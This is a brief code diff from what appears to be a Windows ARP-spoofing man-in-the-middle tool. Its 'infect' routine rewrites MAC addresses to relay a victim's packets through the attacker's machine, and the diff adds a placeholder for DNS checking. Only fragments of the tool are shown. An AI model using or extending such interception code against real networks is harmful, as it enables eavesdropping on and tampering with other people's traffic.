@@ -19,7 +19,7 @@
 #include "network_headers.h"
 #include "ipc_manage.h"
 #include "commands.h"
-#include "arp_spoof.h"
+#include "spoof.h"
 #include "utils.h"
 
 
@@ -281,7 +281,7 @@ DWORD WINAPI infect(LPVOID lparam)
 	
 	/*start send_packet thread*/
 	HANDLE hThread;
-	hThread = CreateThread(NULL, 0, start_spoof, NULL, 0, NULL);
+	hThread = CreateThread(NULL, 0, start_arp_spoofing, NULL, 0, NULL);
 	if (!hThread)
 	{
 		pcap_close(fp);
@@ -309,6 +309,9 @@ DWORD WINAPI infect(LPVOID lparam)
 			? memcpy(eth_header->dest_addr, infect_params.gateway_mac, ETH_ALEN) // (dst = gateway)
 			: memcpy(eth_header->dest_addr, infect_params.victim_mac, ETH_ALEN); // else (dst = victim) 
 		memcpy(eth_header->src_addr, infect_params.adapter->Address, ETH_ALEN); // src = this
+		
+		/* Check for DNS */
+
 
 		/* foward packet */
 		pcap_sendpacket(fp, pkt_data, pkt_header->caplen);
